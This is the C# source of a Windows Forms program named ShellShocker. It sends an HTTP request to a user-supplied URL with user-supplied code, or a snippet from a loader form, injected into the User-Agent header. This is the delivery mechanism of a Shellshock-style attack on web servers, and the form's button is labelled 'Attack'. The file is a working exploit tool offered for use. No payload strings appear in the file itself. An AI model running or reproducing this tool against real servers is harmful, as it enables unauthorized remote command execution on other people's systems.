using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace ShellShocker
{
    public partial class Form1 : Form
    { 
        public Form1()
        {
            InitializeComponent();
            cmbxMethod.SelectedIndex = 0;
        }

        private void btnAttack_Click(object sender, EventArgs e)
        {
            try { DoIT________(); }
            catch { MessageBox.Show("Error"); }
        }

        private void DoIT________()
        {
            var request = (HttpWebRequest)WebRequest.Create(txbxURl.Text);

            request.Method = cmbxMethod.SelectedItem.ToString();

            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent = rxbxCode.Text;
            var response = (HttpWebResponse)request.GetResponse();

            MessageBox.Show(response.StatusCode.ToString(), "Response");
        }

        private void label4_TextChanged(object sender, EventArgs e)
        {
            label4.ForeColor = (label4.Text.ToLower() == "x") ? Color.Red : Color.Green;
            label4.Visible = (label4.Text.ToLower() == "x");
        }

        private void txbxURl_TextChanged(object sender, EventArgs e)
        {
            try
            {
                new Uri(txbxURl.Text);
                label4.Text = "R";
                btnAttack.Enabled = true;
            }
            catch {
                label4.Text = "x";
                btnAttack.Enabled = false;

            
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("http://facebook.com/prince.gersy2");
        }

        private void lnklblLoadsnpt_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Loader l = new Loader();
            if (l.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                rxbxCode.Text = l.listBox1.SelectedItem.ToString();
           
        }
    }
}
